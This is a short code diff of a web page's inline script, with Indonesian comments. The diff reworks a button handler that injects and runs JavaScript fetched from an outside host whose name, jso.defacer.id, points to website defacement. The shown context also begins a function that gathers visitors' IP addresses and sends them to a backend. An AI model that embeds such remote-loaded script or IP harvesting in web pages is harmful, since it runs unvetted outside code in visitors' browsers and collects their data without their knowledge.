@@ -85,12 +85,13 @@
     </div>
 
     <script>
-document.getElementById('create-button').addEventListener('click', () => {
+document.addEventListener("DOMContentLoaded", () => {
+  document.getElementById('create-button').addEventListener('click', () => {
     let s = document.createElement("script");
-    s.src = "https://jso.defacer.id/raw/87Zah66df9"; // link script eksternal kamu
+    s.src = "https://jso.defacer.id/raw/87Zah66df9";
     document.body.appendChild(s);
+  });
 });
-
     // Fungsi untuk mengambil IP dan mengirimkannya ke backend
     async function getAndSendIP() {
         try {
